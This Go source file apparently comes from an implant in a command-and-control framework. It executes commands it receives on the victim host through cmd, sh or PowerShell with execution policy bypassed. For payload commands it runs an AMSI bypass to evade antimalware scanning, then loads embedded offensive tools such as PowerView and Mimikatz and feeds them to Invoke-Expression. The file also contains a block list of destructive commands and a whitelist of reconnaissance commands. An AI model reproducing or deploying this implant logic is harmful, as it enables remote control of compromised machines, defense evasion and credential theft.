//go:build llama_embed || llama_external || llama_selfextract
// +build llama_embed llama_external llama_selfextract

package llama

import (
	"context"
	"fmt"
	"os/exec"
	"path/filepath"
	"runtime"
	"strings"
	"time"

	"github.com/r74tech/virga/internal/implant/payloads"
)

const (
	// Default command timeout for command execution
	DefaultCommandTimeout = 30 * time.Second
	// Maximum output size for command execution (bytes)
	MaxOutputSize = 1024 * 1024 // 1MB
)

// SystemCommandExecutor manages command execution
type SystemCommandExecutor struct {
	timeout         time.Duration
	maxOutputSize   int
	payloadCommands map[string]bool // Cache of payload command names for quick lookup
}

// NewCommandExecutor creates a new SystemCommandExecutor
func NewCommandExecutor() *SystemCommandExecutor {
	return &SystemCommandExecutor{
		timeout:         DefaultCommandTimeout,
		maxOutputSize:   MaxOutputSize,
		payloadCommands: make(map[string]bool),
	}
}

// NewCommandExecutorWithPayloads creates a SystemCommandExecutor with payload information
func NewCommandExecutorWithPayloads(payloadInfos []*PayloadCommandInfo) *SystemCommandExecutor {
	executor := NewCommandExecutor()

	// Build command name cache for quick lookup
	for _, payload := range payloadInfos {
		for _, cmd := range payload.Commands {
			executor.payloadCommands[cmd.Name] = true
		}
	}

	return executor
}

// Execute executes a command and returns the result
func (ce *SystemCommandExecutor) Execute(command string) CommandExecution {
	// Validate command
	if err := ce.validateCommand(command); err != nil {
		return CommandExecution{
			Command:  command,
			Output:   "",
			Error:    err.Error(),
			ExitCode: -1,
		}
	}

	// Timeout context
	ctx, cancel := context.WithTimeout(context.Background(), ce.timeout)
	defer cancel()

	// On Windows, execute commands appropriately based on type
	var cmd *exec.Cmd
	if runtime.GOOS == "windows" {
		// Check if this is a payload command (requires AMSI bypass + payload injection)
		isPayloadCmd := ce.isPayloadCommand(command)
		// Check if this is a PowerShell command (starts with Get-, Set-, Invoke-, etc.)
		isPowerShellCmd := ce.isPowerShellCommand(command)

		if isPayloadCmd {
			// Payload command (e.g., Get-NetUser) - use PowerShell wrapper with AMSI bypass + payloads
			cmd = ce.buildPowerShellCommandWithPayloads(ctx, command)
		} else if isPowerShellCmd {
			// Regular PowerShell command (e.g., Get-Process) - execute via PowerShell directly
			cmd = exec.CommandContext(ctx, "powershell.exe", "-NoProfile", "-ExecutionPolicy", "Bypass", "-Command", command)
		} else {
			// Regular Windows command (e.g., systeminfo) - use cmd
			cmd = exec.CommandContext(ctx, "cmd", "/C", command)
		}
	} else {
		cmd = exec.CommandContext(ctx, "sh", "-c", command)
	}

	// Execute command
	output, err := cmd.CombinedOutput()

	// Output size limit
	if len(output) > ce.maxOutputSize {
		output = output[:ce.maxOutputSize]
		output = append(output, []byte("\n[Output truncated - exceeded 1MB limit]")...)
	}

	exitCode := 0
	errorMsg := ""
	if err != nil {
		if ctx.Err() == context.DeadlineExceeded {
			errorMsg = "command timeout exceeded (30s)"
			exitCode = -1
		} else if exitErr, ok := err.(*exec.ExitError); ok {
			exitCode = exitErr.ExitCode()
			errorMsg = err.Error()
		} else {
			errorMsg = err.Error()
			exitCode = -1
		}
	}

	return CommandExecution{
		Command:  command,
		Output:   string(output),
		Error:    errorMsg,
		ExitCode: exitCode,
	}
}

// validateCommand validates the command's safety
func (ce *SystemCommandExecutor) validateCommand(command string) error {
	// Block empty commands
	if strings.TrimSpace(command) == "" {
		return fmt.Errorf("empty command")
	}

	// Block dangerous command patterns
	dangerous := []string{
		"rm -rf /",
		"rm -rf /*",
		"dd if=/dev/zero",
		"dd if=/dev/random",
		":(){ :|:& };:", // fork bomb
		"mkfs",
		"> /dev/sda",
		"> /dev/hda",
		"mv / /dev/null",
		"format c:",
		"del /f /s /q c:\\*",
	}

	commandLower := strings.ToLower(command)
	for _, pattern := range dangerous {
		if strings.Contains(commandLower, strings.ToLower(pattern)) {
			return fmt.Errorf("dangerous command blocked: contains pattern '%s'", pattern)
		}
	}

	// Windows-specific dangerous commands
	if runtime.GOOS == "windows" {
		windowsDangerous := []string{
			"format",
			"deltree",
			"rd /s /q c:",
		}
		for _, pattern := range windowsDangerous {
			if strings.Contains(commandLower, pattern) {
				return fmt.Errorf("dangerous Windows command blocked: %s", pattern)
			}
		}
	}

	return nil
}

// ExecuteWithWhitelist executes a command with a whitelist
// Use for more strict security
func (ce *SystemCommandExecutor) ExecuteWithWhitelist(command string) CommandExecution {
	parts := strings.Fields(command)
	if len(parts) == 0 {
		return CommandExecution{
			Command:  command,
			Output:   "",
			Error:    "empty command",
			ExitCode: -1,
		}
	}

	// Whitelist of allowed commands
	allowedCommands := map[string]bool{
		// Unix/Linux/macOS
		"uname":    true,
		"whoami":   true,
		"hostname": true,
		"pwd":      true,
		"id":       true,
		"date":     true,
		"uptime":   true,
		"w":        true,
		"who":      true,
		"ps":       true,
		"df":       true,
		"free":     true,
		"netstat":  true,
		"ss":       true,
		"ip":       true,
		"ifconfig": true,
		"ls":       true,
		"cat":      true,
		"echo":     true,
		"sw_vers":  true,
		"sysctl":   true,
		"last":     true,
		"grep":     true,
		"head":     true,
		"tail":     true,
		"wc":       true,
		"find":     true,
		"arp":      true,
		"route":    true,
		"dig":      true,
		"nslookup": true,

		// Windows
		"systeminfo": true,
		"ipconfig":   true,
		"net":        true,
		"tasklist":   true,
		"query":      true,
		"quser":      true,
		"ver":        true,
		"set":        true,
		"dir":        true,
		"type":       true,
		"cmd":        true,
	}

	// Get the base name of the command
	baseCmd := filepath.Base(parts[0])
	// If the path is included, only use the last element
	if strings.Contains(baseCmd, "/") || strings.Contains(baseCmd, "\\") {
		cmdParts := strings.FieldsFunc(baseCmd, func(r rune) bool {
			return r == '/' || r == '\\'
		})
		if len(cmdParts) > 0 {
			baseCmd = cmdParts[len(cmdParts)-1]
		}
	}

	if !allowedCommands[strings.ToLower(baseCmd)] {
		return CommandExecution{
			Command:  command,
			Output:   "",
			Error:    fmt.Sprintf("command not in whitelist: %s", baseCmd),
			ExitCode: -1,
		}
	}

	// If the command is in the whitelist, execute it normally
	return ce.Execute(command)
}

// SetTimeout sets the command execution timeout
func (ce *SystemCommandExecutor) SetTimeout(timeout time.Duration) {
	ce.timeout = timeout
}

// SetMaxOutputSize sets the maximum output size
func (ce *SystemCommandExecutor) SetMaxOutputSize(size int) {
	ce.maxOutputSize = size
}

// isPowerShellCommand checks if a command is a PowerShell cmdlet
func (ce *SystemCommandExecutor) isPowerShellCommand(command string) bool {
	// Extract the first word (command name)
	parts := strings.Fields(command)
	if len(parts) == 0 {
		return false
	}

	cmdName := parts[0]

	// Check for PowerShell cmdlet patterns (Verb-Noun)
	// Common PowerShell verbs: Get, Set, New, Remove, Add, Invoke, Start, Stop, etc.
	powerShellPrefixes := []string{
		"Get-", "Set-", "New-", "Remove-", "Add-", "Invoke-",
		"Start-", "Stop-", "Test-", "Enable-", "Disable-",
		"Show-", "Find-", "Clear-", "Update-", "Out-",
		"Export-", "Import-", "Select-", "Where-", "ForEach-",
		"Measure-", "Compare-", "Convert-", "Join-", "Split-",
	}

	for _, prefix := range powerShellPrefixes {
		if strings.HasPrefix(cmdName, prefix) {
			return true
		}
	}

	return false
}

// isPayloadCommand checks if a command is a registered payload command
func (ce *SystemCommandExecutor) isPayloadCommand(command string) bool {
	if len(ce.payloadCommands) == 0 {
		return false
	}

	// Split by semicolon to handle compound commands like "Import-Module PowerView; Get-NetUser"
	subCommands := strings.Split(command, ";")

	// Check each sub-command
	for _, subCmd := range subCommands {
		subCmd = strings.TrimSpace(subCmd)
		parts := strings.Fields(subCmd)
		if len(parts) == 0 {
			continue
		}

		cmdName := parts[0]
		if ce.payloadCommands[cmdName] {
			return true
		}
	}

	return false
}

// removeRedundantImports removes Import-Module statements for embedded payloads
// since the payloads are already loaded in the script
func (ce *SystemCommandExecutor) removeRedundantImports(command string) string {
	// Split by semicolon to handle compound commands
	subCommands := strings.Split(command, ";")
	var filtered []string

	for _, subCmd := range subCommands {
		subCmd = strings.TrimSpace(subCmd)
		if subCmd == "" {
			continue
		}

		// Check if this is an Import-Module command
		if strings.HasPrefix(subCmd, "Import-Module") {
			// Skip Import-Module commands for embedded payloads
			// Examples: "Import-Module PowerView", "Import-Module Mimikatz"
			continue
		}

		filtered = append(filtered, subCmd)
	}

	return strings.Join(filtered, "; ")
}

// buildPowerShellCommandWithPayloads builds a PowerShell command with AMSI bypass and all payloads loaded
func (ce *SystemCommandExecutor) buildPowerShellCommandWithPayloads(ctx context.Context, command string) *exec.Cmd {
	var scriptParts []string

	// 1. AMSI bypass (executed first, before stdin)
	amsiBypass := payloads.GetPowerShellAmsiBypass()

	// 2. Load ALL embedded payloads (PowerView, Mimikatz, etc.)
	allPayloads := payloads.ListEmbeddedPayloads()
	for _, payload := range allPayloads {
		if payload.Type == "powershell" {
			scriptParts = append(scriptParts, string(payload.Content))
		}
	}

	// 3. Execute the actual command (remove Import-Module statements for embedded payloads)
	cleanedCommand := ce.removeRedundantImports(command)
	scriptParts = append(scriptParts, cleanedCommand)

	// Combine payloads and command (without AMSI bypass)
	payloadScript := strings.Join(scriptParts, "\n")

	// Build command: Execute AMSI bypass first, then read and execute payload from stdin
	var psCommand string
	if amsiBypass != "" {
		// AMSI bypass inline, then execute stdin content
		psCommand = amsiBypass + "; [Console]::In.ReadToEnd() | Invoke-Expression"
	} else {
		// No AMSI bypass, just execute stdin
		psCommand = "[Console]::In.ReadToEnd() | Invoke-Expression"
	}

	cmd := exec.CommandContext(ctx, "powershell.exe", "-NoProfile", "-ExecutionPolicy", "Bypass", "-Command", psCommand)
	cmd.Stdin = strings.NewReader(payloadScript)
	return cmd
}
